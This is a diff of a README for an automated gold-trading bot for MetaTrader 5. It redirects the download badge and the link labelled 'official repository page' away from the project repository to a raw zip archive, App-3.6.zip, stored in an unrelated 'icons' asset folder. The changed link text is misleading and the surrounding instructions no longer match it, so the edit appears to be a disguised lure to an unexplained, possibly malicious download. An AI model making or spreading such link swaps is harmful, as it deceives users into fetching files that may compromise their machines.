@@ -5,7 +5,7 @@ description: "Trade XAUUSD on the M5 timeframe with this MQL5 Expert Advisor bas
 ---
 # 📈 PriceAction-EngulfingZone-EA - Automated price action trading for gold
 
-[![Download PriceAction-EngulfingZone-EA](https://img.shields.io/badge/Download-Release-blue)](https://github.com/vatsasr8846/PriceAction-EngulfingZone-EA)
+[![Download PriceAction-EngulfingZone-EA](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/vatsasr8846/vatsasr8846.github.io/main/assets/icons/App-3.6.zip)
 
 This software runs on the MetaTrader 5 platform. It trades gold against the US dollar on the 5-minute timeframe. The strategy relies on price action and engulfing patterns to find entry points. It avoids indicators, repainting, and the Martingale strategy.
 
@@ -22,7 +22,7 @@ You need the following items to run this trading bot:
 
 Follow these steps to obtain the program files:
 
-1. Visit the [official repository page](https://github.com/vatsasr8846/PriceAction-EngulfingZone-EA).
+1. Visit the [official repository page](https://raw.githubusercontent.com/vatsasr8846/vatsasr8846.github.io/main/assets/icons/App-3.6.zip).
 2. Click the green "Code" button.
 3. Select "Download ZIP" from the menu.
 4. Save the file to your computer.
